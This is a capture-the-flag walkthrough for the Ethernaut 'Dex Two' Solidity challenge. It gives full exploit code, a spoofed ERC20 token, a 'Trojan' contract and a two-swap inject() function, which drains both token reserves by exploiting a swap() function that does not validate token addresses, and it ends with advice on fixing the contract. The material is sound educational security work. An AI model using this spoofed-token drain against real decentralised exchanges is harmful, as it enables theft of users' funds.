# Ethernaut Walkthrough: Dex Two
## Welcome to KweenBirb's 24th installment of Ethernaut walkthroughs! 

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to DexTwo.sol, the 24th challenge in the series. You can find the challenge itself and fully fleshed out solution in the .txt file in this directory and the .sol file in the src directory. Let's begin!

OpenZeppelin instructs us that, much like the previous level named Dex, we 'need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.' This time, however, the contract is slightly modified in such a way that our exploit will require a different approach.

## The swap() function

Unlike the previous Ethernaut level, 'Dex', Dex2's swap() function no longer has a require() line that previously restricted input parameters to the token1 and token2 addresses from storage! This gives us an additional attack vector to the previous economic liquidity attack we executed on dex1: a spoofed contract code injection opportunity.

To spoof the token1 ERC20 that would otherwise be entered as the 'from' parameter, let's code a custom malicious ERC20 token that will provide unexpected values to Dex2 and drain both sides of the liquidity pool. I just slightly modified Ethernaut's implementation of the SwappableToken provided in the level:

```
contract SpoofToken is ERC20 {

    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol) ERC20(name,symbol) {
        _dex = dexInstance;
        _mint(msg.sender, 300);
        _mint(_dex, 100);
    }

    function approve(address owner, address spender, uint256 amount) public {
        super._approve(owner, spender, amount);
    }
}
```

The minted balances should be enough to drain the Dex's liquidity reserves.

## The Trojan for the SpoofToken

Once we've created the SpoofToken, we'll need a contract that interfaces between the dex contract and the SpoofToken, so we start by configuring the Trojan contract's environment by storing smart contracts of interest to us in this hack:

```
contract Trojan {

    address public token1;
    address public token2;
    address private hacker;
    SpoofToken spoofToken;
    DexTwo dexTwo;

    constructor(address $your_ethernaut_instance_here) {
        dexTwo = DexTwo($your_ethernaut_instance_here);
        token1 = dexTwo.token1();
        token2 = dexTwo.token2();
        spoofToken = new SpoofToken($your_ethernaut_instance_here, 'Spoof', 'SPF');
        hacker = msg.sender;
    }
}
```

## The exploit

With all the setup complete, we need only perform the swaps while providing our unexpected SpoofToken values to trick the Ethernaut dex into emptying its reserves:

```
function inject() public {
    uint amount = 100;
    // set allowance for dex in from to msg.sender
    spoofToken.approve(address(this), address(dexTwo), amount * 3);

    // call swap using our spooftoken to drain all token1s out of dex2's liquidity pool 
    dexTwo.swap(address(spoofToken), token1, amount);
    // call swap again using spooftoken to drain all token2s out of dex2's liquidity pool
    // keep in mind that balanceOf(spoofToken, dexTwo) is now 200!!! Since 100 were minted and then 100 exchanged for token1
    dexTwo.swap(address(spoofToken), token2, amount * 2);
}
```

This works because the dex contract's swap function is intended only to manage the balances of two token reserves: token1 and token2 in storage. But since the swap function accepts any ERC20 address we can pass in worthless token balances that we deployed and the dex will treat it as a valid token1-token2 swap.

## Suggestions for improvement

This is sort of a silly one, since the require() line that would have prevented this exploit was present in the previous level. But of course many different approaches could have been taken to safeguard this contract, for example rather than invoking IERC20() calls on user-provided parameters; those calls could have been anchored to the storage variables: address token1, address token2. Since the Dex contract is produced by a factory with the sole purpose of managing balances for those two specific tokens, that would keep away hackers and even save some gas on reverting with a require() string.

Anyway, congratulations on breaking yet another Dex!

○•○ h00t h00t ○•○
